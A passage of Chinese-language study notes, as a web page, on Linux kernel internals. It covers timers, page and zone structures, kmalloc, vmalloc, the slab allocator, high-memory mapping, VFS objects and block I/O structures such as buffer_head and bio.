title="schedule_timeout()的实现"></a>schedule_timeout()的实现</h5><p>该函数用原始的名字timer创建了一个定时器timer，然后设置超时时间timeout，设置超时执行函数process_timeout()；接着激活定时器而且调用schedule()。因为任务标识为TASK_INTERRUPTIBLE或TASK_UNINTERRUPTIBLE，所以调度程序不会再选择该任务投入运行，而会选择其他新任务运行。</p><p>当定时器超时时，process_timeout()函数会被调用，将任务设置为TASK_RUNNING状态，然后将其放入运行队列。</p><p>如果任务提前被唤醒（如收到信号），那么定时器被撤销，process_timeout()函数返回剩余的时间。</p><h2 id="内存管理"><a href="#内存管理" class="headerlink" title="内存管理"></a>内存管理</h2><h3 id="页"><a href="#页" class="headerlink" title="页"></a>页</h3><p>内核把物理页作为内存管理的基本单位。</p><p>内核用struct page结构表示系统中的每个物理页，该结构位于&lt;linux/mm_types.h&gt;：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">page</span> &#123;</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> flags;<span class="comment">//存放页的状态，定义在&lt;linux/page-flags.h&gt;中</span></span><br><span class="line"><span class="keyword">atomic_t</span> _count;<span class="comment">//存放页的引用计数</span></span><br><span class="line"><span class="keyword">union</span> &#123;</span><br><span class="line"><span class="keyword">atomic_t</span> _mapcount</span><br><span class="line"><span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">u16 inuse;</span><br><span class="line">u16 objects;</span><br><span class="line">&#125;;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">union</span> &#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">private</span>;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">address_space</span> *<span class="title">mapping</span>;</span></span><br><span class="line">    &#125;;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> NR_CPUS &gt;= CONFIG_SPLIT_PTLOCK_CPUS</span></span><br><span class="line">    <span class="keyword">spinlock_t</span> ptl;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache</span> *<span class="title">slab</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">first_page</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">union</span> &#123;</span><br><span class="line"><span class="keyword">pgoff_t</span> index;</span><br><span class="line"><span class="keyword">void</span> *freelist;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">lru</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> defined(WANT_PAGE_VIRTUAL)</span></span><br><span class="line"><span class="keyword">void</span> *<span class="keyword">virtual</span>;<span class="comment">//即页的虚拟地址。</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_CGROUP_MEM_RES_CTLR</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> page_cgroup;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>一个页可也由页缓存使用（这时，mapping域指向这个页关联的address_space对象），或者作为私有数据（由private指向），或者作为进程页表中的映射。</p><p>page结构与物理页相关，因此，该结构对页的描述只是短暂的。</p><h3 id="区"><a href="#区" class="headerlink" title="区"></a>区</h3><p>Linux主要使用了四种区：</p><p>ZONE_DMA——这个区包含的页能用来执行DMA操作。</p><p>ZONE_DMA32——这个区与ZONE_DMA不同之处在于这些页面只能被32位设备访问。</p><p>ZONE_NORMAL——这个区包含的都是能正常映射的页。</p><p>ZONE_HIGHEM——这个区包含“高端内存”，其中的页并不能永久地映射到内核地址空间。</p><p>这些区定义在&lt;linux/mmzone.h&gt;中。</p><p>每个区都用struct zone表示，定义在&lt;linux/mmzone.h&gt;中：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">zone</span> &#123;</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span>pages_min, pages_low, pages_high;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span>lowmem_reserve[MAX_NR_ZONES];</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_NUMA</span></span><br><span class="line"><span class="keyword">int</span> node;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span>min_unmapped_pages;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span>min_slab_pages;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">per_cpu_pageset</span>*<span class="title">pageset</span>[<span class="title">NR_CPUS</span>];</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">per_cpu_pageset</span><span class="title">pageset</span>[<span class="title">NR_CPUS</span>];</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="keyword">spinlock_t</span>lock;<span class="comment">//防止并发访问</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_MEMORY_HOTPLUG</span></span><br><span class="line"><span class="keyword">seqlock_t</span>span_seqlock;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">free_area</span><span class="title">free_area</span>[<span class="title">MAX_ORDER</span>];</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> CONFIG_SPARSEMEM</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span>*pageblock_flags;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">ZONE_PADDING(_pad1_)</span><br><span class="line"><span class="keyword">spinlock_t</span>lru_lock;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span><span class="title">active_list</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span><span class="title">inactive_list</span>;</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span>nr_scan_active;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span>nr_scan_inactive;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span>pages_scanned;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span>flags;</span><br><span class="line"><span class="keyword">atomic_long_t</span>vm_stat[NR_VM_ZONE_STAT_ITEMS];</span><br><span class="line"><span class="keyword">int</span> prev_priority;</span><br><span class="line">ZONE_PADDING(_pad2_)</span><br><span class="line"><span class="keyword">wait_queue_head_t</span>* wait_table;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span>wait_table_hash_nr_entries;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span>wait_table_bits;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pglist_data</span>*<span class="title">zone_pgdat</span>;</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span>zone_start_pfn;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span>spanned_pages;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span>present_pages;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span>*name;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>内核启动期间初始化name值，代码位于mm/page_alloc.c中。</p><h3 id="获得页"><a href="#获得页" class="headerlink" title="获得页"></a>获得页</h3><p>内核提供了请求内存的底层机制，并提供了对它进行访问的几个接口，所有接口都以页为单位分配内存，定义于&lt;linux/gfp.h&gt;中。</p><h3 id="kmalloc"><a href="#kmalloc" class="headerlink" title="kmalloc()"></a>kmalloc()</h3><p>所分配的内存在物理上是连续的。</p><p>kmalloc()在&lt;linux/slab.h&gt;中声明。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> * <span class="title">kmalloc</span><span class="params">(<span class="keyword">size_t</span> <span class="built_in">size</span>, <span class="keyword">gfp_t</span> flags)</span></span>;</span><br></pre></td></tr></table></figure><h4 id="gfp-mask标志"><a href="#gfp-mask标志" class="headerlink" title="gfp_mask标志"></a>gfp_mask标志</h4><p>这些标志可以分为三类：行为修饰符、区修饰符及类型。</p><p>所有标志在&lt;linux/gfp.h&gt;中声明。</p><h5 id="行为修饰符"><a href="#行为修饰符" class="headerlink" title="行为修饰符"></a>行为修饰符</h5><p>表示内核应当如何分配所需的内存。</p><h5 id="区修饰"><a href="#区修饰" class="headerlink" title="区修饰"></a>区修饰</h5><p>表示从哪儿分配内存。</p><h5 id="类型"><a href="#类型" class="headerlink" title="类型"></a>类型</h5><p>组合了行为修饰和区修饰，将各种组合归纳为不同类型。</p><h4 id="kfree"><a href="#kfree" class="headerlink" title="kfree()"></a>kfree()</h4><p>kfree(NULL)是安全的。</p><h3 id="vmalloc"><a href="#vmalloc" class="headerlink" title="vmalloc()"></a>vmalloc()</h3><p>该函数工作方式类似于kmalloc()，只不过分配的内存虚拟地址连续，而物理地址则无须连续。</p><p>vmalloc()函数声明在&lt;linux/vmalloc.h&gt;中，定义在&lt;mm/vmalloc.c&gt;中。</p><p>获得的内存可用vfree()释放。</p><h3 id="slab层"><a href="#slab层" class="headerlink" title="slab层"></a>slab层</h3><h5 id="slab层的设计"><a href="#slab层的设计" class="headerlink" title="slab层的设计"></a>slab层的设计</h5><p>每个高速缓存可用由多个slab组成，slab由一个或多个物理上连续的页组成。每个slab都包含一些对象成员。每个slab处于三种状态之一：满、部分满或空。</p><p>当内核的某一部分需要一个新的对象时，先从部分满的slab中进行分配；如果没有部分满的slab，就从空的slab中进行分配；如果没有空的slab，就要创建一个slab了。</p><p>例如，struct inode就由inode_cachep高速缓存进行分配，这种高速缓存由一个或多个slab组成，每个slab包含尽可能多的struct inode对象。</p><p>每个高速缓存都使用kmem_cache结构来表示，这个结构包含三个链表：slabs_full、slabs_partial和slabs_empty，均存放在kmem_list3结构内，该结构在mm/slab.c中定义。这些链表包含的高速缓存中的所有slab。</p><p>slab描述符struct slab用来描述每个slab：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">slab</span>&#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">list</span>;</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> colouroff;</span><br><span class="line"><span class="keyword">void</span> *s_mem;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> inuse;</span><br><span class="line"><span class="keyword">kmem_bufctl_t</span> <span class="built_in">free</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>slab描述符要么在slab之外另行分配，要么就放在slab自身开始的地方。如果slab很小，或者slab内存有足够的空间容纳slab描述符，那么描述符就存放在slab里面。</p><p>slab分配器可以创建新的slab，这是通过__get_free_pages()低级内核页分配器进行的。</p><p>只有在下列情况下才会调用释放函数：当可用内存变得紧缺时，系统试图释放出更多内存以供使用；或者当高速缓存显式地被撤销时。</p><h4 id="slab分配器接口"><a href="#slab分配器接口" class="headerlink" title="slab分配器接口"></a>slab分配器接口</h4><h3 id="在栈上的静态分配"><a href="#在栈上的静态分配" class="headerlink" title="在栈上的静态分配"></a>在栈上的静态分配</h3><h4 id="单页内核栈"><a href="#单页内核栈" class="headerlink" title="单页内核栈"></a>单页内核栈</h4><p>中断栈为每个进程提供一个用于中断处理程序的栈。</p><h3 id="高端内存的映射"><a href="#高端内存的映射" class="headerlink" title="高端内存的映射"></a>高端内存的映射</h3><h4 id="永久映射"><a href="#永久映射" class="headerlink" title="永久映射"></a>永久映射</h4><p>要映射一个给定的page结构到内核地址空间，可以使用定义在文件&lt;linux/highmem.h&gt;中的这个函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">kmap</span><span class="params">(struct page *page)</span></span>;</span><br></pre></td></tr></table></figure><p>这个函数可以睡眠，因此只能用在进程上下文中。</p><p>解除映射：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">kunmap</span><span class="params">(struct page *page)</span></span>;</span><br></pre></td></tr></table></figure><h4 id="临时映射"><a href="#临时映射" class="headerlink" title="临时映射"></a>临时映射</h4><p>临时银蛇可以用在不能睡眠的地方，因为获取映射时绝不会阻塞，同时禁止内核抢占：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">kmap_atomic</span><span class="params">(struct page *page, <span class="keyword">enum</span> km_type type)</span></span>;</span><br></pre></td></tr></table></figure><p>参数type描述了临时映射的目的，定义于&lt;asm/kmap_types.h&gt;中。</p><p>取消映射：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">kunmap_atomic</span><span class="params">(<span class="keyword">void</span> *kvaddr, <span class="keyword">enum</span> km_type type)</span></span>;</span><br></pre></td></tr></table></figure><p>除非激活了内核抢占，否则kunmap_atomic()无须做什么实际的事情，只有在下一个临时映射到来前上一个临时映射才有效。下一个原子映射将自动覆盖前一个映射。</p><h3 id="每个CPU的分配"><a href="#每个CPU的分配" class="headerlink" title="每个CPU的分配"></a>每个CPU的分配</h3><h4 id="新的每个CPU接口"><a href="#新的每个CPU接口" class="headerlink" title="新的每个CPU接口"></a>新的每个CPU接口</h4><p>&lt;linux/percpu.h&gt;中声明了所有接口操作例程，可以在mm/slab.c和&lt;asm/percpu.h&gt;中找到定义。</p><h2 id="虚拟文件系统"><a href="#虚拟文件系统" class="headerlink" title="虚拟文件系统"></a>虚拟文件系统</h2><p>VFS使得用户可以直接使用open()、read()和write()这样的系统调用而无须考虑具体文件系统和实际物理介质。</p><h3 id="文件系统抽象层"><a href="#文件系统抽象层" class="headerlink" title="文件系统抽象层"></a>文件系统抽象层</h3><p>VFS提供了一个通用文件系统模型，该模型囊括了任何文件系统的常用功能集合行文。</p><p><img src="./img/1586854070.jpg" alt="从用户控件的write调用到数据被写入磁盘介质"></p><h3 id="Unix文件系统"><a href="#Unix文件系统" class="headerlink" title="Unix文件系统"></a>Unix文件系统</h3><p>Unix使用了四种和文件系统相关的传统抽象概念：文件、目录项、索引节点和安装点。</p><p>在Unix中，文件系统被安装在一个特定的安装点上，该安装点在全局层次结构中被称作命名空间，所有的已安装文件系统都作为根文件系统树的枝叶出现在系统中。</p><p>Unix系统将文件的相关信息和文件本身这两个概念加以区分。文件相关信息有时被称作文件的元数据，被存储在一个单独的数据结构中，该结构被称为索引节点。</p><p>文件系统的控制信息存储在超级块中，超级块是一种包含文件系统信息的数据结构。</p><h3 id="VFS对象及其数据结构"><a href="#VFS对象及其数据结构" class="headerlink" title="VFS对象及其数据结构"></a>VFS对象及其数据结构</h3><p>VFS中有四个主要的对象类型：</p><ul><li>超级块对象——它代表一个具体的已安装的文件系统。</li><li>索引节点对象——它代表一个具体文件。</li><li>目录项对象——它代表一个目录项，是路径的一个组成部分。</li><li>文件对象——它代表由进程打开的文件。</li></ul><p>每个主要对象中都包含一个操作对象，这些操作对象描述了内核针对主要对象可以使用的方法：</p><ul><li>super_operations对象，其中包括内核针对特定文件系统所能调用的方法，如write_inode()和sysnc_fs()等方法。</li><li>inode_operations对象，其中包括内核针对特定文件所能调用的方法，比如create()和link()等方法。</li><li>dentry_operations对象，其中包括内核针对特定目录所能调用的方法，比如d_compare()和d_delete等方法。</li><li>file_operations对象，其中包括针对针对已打开文件所能调用的方法，比如read()和write()等方法。</li></ul><p>操作对象作为一个结构体指针来实现，此结构体重包含指向操作其父对象的函数指针。</p><h3 id="超级块对象"><a href="#超级块对象" class="headerlink" title="超级块对象"></a>超级块对象</h3><p>该对象用于存储特定文件系统的信息，通常对应于存放在磁盘待定扇区中的文件系统超级块或文件系统控制块。</p><p>超级块对象由super_block结构体表示，定义在&lt;linux/fs.h&gt;中。</p><p>创建、管理和撤销超级快对象的代码位于文件fs/super.c中。</p><h3 id="超级块操作"><a href="#超级块操作" class="headerlink" title="超级块操作"></a>超级块操作</h3><p>操作块对象中的s_op域指向超级块的操作函数表。超级块操作函数表又super_operations结构体表示，定义在文件&lt;linux/fs.h&gt;中。</p><p>超级块操作函数都是由VFS在进程上下文中调用。除了dirty_inode()，其他函数在必要时都可以阻塞。</p><p>如果VFS发现操作函数指针是NULL，那么它要么就会调用通用函数执行相应操作，要么什么也不做。</p><h3 id="索引节点对象"><a href="#索引节点对象" class="headerlink" title="索引节点对象"></a>索引节点对象</h3><p>索引节点对象包含了内核在操作文件或目录时需要的全部信息。</p><p>索引节点对象由inode结构体表示，它定义在文件&lt;linux/fs.h&gt;中。</p><p>索引节点仅当文件被访问时，才在内存中创建。</p><h3 id="索引节点操作"><a href="#索引节点操作" class="headerlink" title="索引节点操作"></a>索引节点操作</h3><p>索引节点对象中用i_op(inode_operations)来存储操作函数表，该结构体定义在文件&lt;linux/fs.h&gt;中。</p><h3 id="目录项对象"><a href="#目录项对象" class="headerlink" title="目录项对象"></a>目录项对象</h3><p>目录项对象由dentry结构体表示，定义在&lt;linux/dcache.h&gt;中。</p><h4 id="目录项状态"><a href="#目录项状态" class="headerlink" title="目录项状态"></a>目录项状态</h4><p>目录项对象有三种有效状态：被使用、未被使用和负状态。</p><p>一个被使用的目录项对应一个有效的索引节点，并且表明该对象存在一个或多个使用者（d_count为正值）。一个目录项处于被使用状态，意味着它正被VFS使用并且指向有效的数据，因此不能被丢弃。</p><p>一个被使用的目录项对应一个有效的索引节点，但是d_count为0,。该目录表项仍然指向一个有效对象，而且被保留在缓存中以便需要时使用它。</p><p>一个负状态的目录项没有对应的有效索引节点（d_inode为NULL），因为索引节点已被删除，或路径不再正确，但是目录项仍然保留，以便快速解析以后的路径查询。</p><h4 id="目录项缓存"><a href="#目录项缓存" class="headerlink" title="目录项缓存"></a>目录项缓存</h4><p>内核将目录项对象缓存在目录项缓存（dcache）中。目录项缓存包括三个主要部分：</p><ul><li>“被使用的”目录项链表。将链表通过所以节点对象中的i_dentry项链接相关的索引节点。</li><li>“最近被使用的”双向链表。该链表含有未被使用和负状态的目录项对象。因为该链表总是在头部插入目录项，故链头节点的数据总比链尾节点的数据要新。删除时，从链尾删除节点项。</li><li>散列表和相应的散列函数用来快速地将给定路径解析为相关目录项对象。</li></ul><p>散列表由数组dentry_hashtable表示，其中每个元素都是一个指向具有相同键值的目录项对象链表指针。</p><p>实际的散列值由d_hash()函数计算。</p><p>查找散列表要通过d_lookup()函数。</p><h3 id="目录项操作"><a href="#目录项操作" class="headerlink" title="目录项操作"></a>目录项操作</h3><p>dentry_operation结构体指明了VFS操作目录项的所有方法，该结构体定义在文件&lt;linux/dcache.h&gt;中。</p><h3 id="文件对象"><a href="#文件对象" class="headerlink" title="文件对象"></a>文件对象</h3><p>文件对象表示进程已打开的文件。</p><p>文件对象由file结构体表示，定义在文件&lt;linux/fs.h&gt;中。</p><p>文件对象通过f_dentry指针指向相关的目录项对象。</p><h3 id="文件操作"><a href="#文件操作" class="headerlink" title="文件操作"></a>文件操作</h3><p>文件对象的操作由file_operations结构体表示，定义在文件&lt;linux/fs.h&gt;中。</p><h3 id="和文件系统相关的数据结构"><a href="#和文件系统相关的数据结构" class="headerlink" title="和文件系统相关的数据结构"></a>和文件系统相关的数据结构</h3><p>file_system_type——该结构用来描述各种特定文件系统类型，如ext3、ext4或UDF。</p><p>vfsmount——用来描述一个安装文件系统的实例。</p><p>file_system_type定义在&lt;linux/fs.h&gt;中。</p><p>每种文件系统，不管有多少实例安装到系统中，还是根本没有安装到系统中，都只有一个file_system_type结构。</p><p>当文件系统被实际安装时，将有一个vfsmount结构体在安装点被创建。vfsmount结构被定义在&lt;linux/mount.h&gt;中。</p><p>vfsmount保存了安装时指定的标志信息，存储在mnt_flages域中。标志信息定义在&lt;linux/mount.h&gt;中。</p><h3 id="和进程相关的数据结构"><a href="#和进程相关的数据结构" class="headerlink" title="和进程相关的数据结构"></a>和进程相关的数据结构</h3><p>有三个数据结构将VFS层和系统的进程联系在一起，分别是：file_struct、fs_struct和namespace结构体。</p><p>file_struct结构体定义在&lt;linux/fdtable.h&gt;中。该结构体由进程描述符中的files目录项指向。所有与单个进程相关的信息都包含在其中。</p><p>fs_struct结构体定义在&lt;linus/fs_struct.h&gt;中。该结构体由进程描述符的fs域指向。它包含文件系统和进程相关的信息。</p><p>namespace结构体定义在&lt;linux/mmt_namespace.h&gt;中。由进程描述符中的mmt_namespace域指向。单进程命名空间使得每一个进程在系统中都看的唯一的安装文件系统——不仅是唯一的根目录，而且是唯一的文件系统层次结构。</p><p>默认情况下，所有进程共享同一命名空间。只有在clone()操作时使用CLONE_NEWS标志，才会给进程一个唯一的命名空间结构体的拷贝。</p><h2 id="块I-O层"><a href="#块I-O层" class="headerlink" title="块I/O层"></a>块I/O层</h2><p>系统中能随机（不按顺序）访问固定大小数据片的硬件设备称作块设备。这些固定大小的数据片就称作块。</p><p>字符设备按照字符流的方式被有序访问。</p><h3 id="剖析一个块设备"><a href="#剖析一个块设备" class="headerlink" title="剖析一个块设备"></a>剖析一个块设备</h3><p>块设备中最小的可寻址单元是扇区（有时也称作“硬扇区”、“设备块”）。</p><p>块（也称作“文件块”或“I/O块”）是最小逻辑可寻址单元，块是文件系统的一种抽象——只能基于块来访问文件系统。块只能数倍于扇区大小。</p><p><img src="./img/1586921047.png" alt="扇区与缓冲区之间的关系"></p><h3 id="缓冲区与缓冲区头"><a href="#缓冲区与缓冲区头" class="headerlink" title="缓冲区与缓冲区头"></a>缓冲区与缓冲区头</h3><p>当一个块被调入内存时（即在读入后或等待写出时），它要存储在一个缓冲区中。每个缓冲区与一个块对应，它相当与是磁盘块在内存中的表示。</p><p>每一个缓冲区都有一个对应的描述，该描述符用buffer_head结构体表示，称作缓冲区头定义在文件&lt;linux/buffer_head.h&gt;中，它包含了内核操作缓冲区所需要的全部信息。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">buffer_head</span> &#123;</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> b_state;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">buffer_head</span> *<span class="title">b_this_page</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">b_page</span>;</span></span><br><span class="line"><span class="keyword">sector_t</span> b_blocknr;</span><br><span class="line"><span class="keyword">size_t</span> b_size;</span><br><span class="line"><span class="keyword">char</span> *b_data;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">block_device</span> *<span class="title">b_bdev</span>;</span></span><br><span class="line"><span class="keyword">bh_end_io_t</span> *b_end_io;</span><br><span class="line"> <span class="keyword">void</span> *b_private;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">b_assoc_buffers</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">address_space</span> *<span class="title">b_assoc_map</span>;</span></span><br><span class="line"><span class="keyword">atomic_t</span> b_count;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>其中b_state表示缓冲区状态。合法标志存放在bh_state_bits枚举中，该枚举在&lt;linux/buffer_head.h&gt;中定义。</p><p>b_count域表示缓冲区的使用计数，可以通过两个定义在文件&lt;linux/buffer_head.h&gt;中的内联函数对此域进行增减。</p><p>与缓冲区对应的磁盘物理块由b_blocknr-th域索引，该值是b_bdev域指明的块设备中的逻辑块号。</p><p>与缓冲区对应的内存物理页由b_page域表示。另外，b_data域直接指向相应的块，块的大小由b_size域表示。</p><p>缓冲头的目的在于描述磁盘块和物理内存缓冲区之间的映射关系。</p><h3 id="bio结构体"><a href="#bio结构体" class="headerlink" title="bio结构体"></a>bio结构体</h3><p>内核中块I/O操作的基本容器由bio结构体表示，定义在&lt;linux/bio.h&gt;中。该结构代表了正在现场的（活动的）以及片段链表形式组织的块I/O操作。一个片段是一小块连续的内存缓冲区。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bio</span> &#123;</span></span><br><span class="line"><span class="keyword">sector_t</span>bi_sector;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bio</span>*<span class="title">bi_next</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">block_device</span>*<span class="title">bi_bdev</span>;</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span>bi_flags;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span>bi_rw;</span><br><span class="line"><span class="keyword">unsigned</span> shortbi_vcnt;</span><br><span class="line"><span class="keyword">unsigned</span> shortbi_idx;</span><br><span class="line"><span class="keyword">unsigned</span> shortbi_phys_segments;</span><br><span class="line"><span class="keyword">unsigned</span> shortbi_hw_segments;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span>bi_size;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span>bi_hw_front_size;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span>bi_hw_back_size;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span>bi_max_vecs;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bio_vec</span>*<span class="title">bi_io_vec</span>;</span></span><br><span class="line"><span class="keyword">bio_end_io_t</span>*bi_end_io;</span><br><span class="line"><span class="keyword">atomic_t</span>bi_cnt;</span><br><span class="line"><span class="keyword">void</span>*bi_private;</span><br><span class="line"><span class="keyword">bio_destructor_t</span>*bi_destructor;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><img src="./img/1586931445.png" alt="bio结构体、bio_vec结构体和page结构体之间的关系"></p><h4 id="I-O向量"><a href="#I-O向量" class="headerlink" 